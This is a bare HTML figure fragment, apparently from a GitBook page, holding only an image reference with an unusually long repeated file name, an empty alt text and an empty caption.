<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

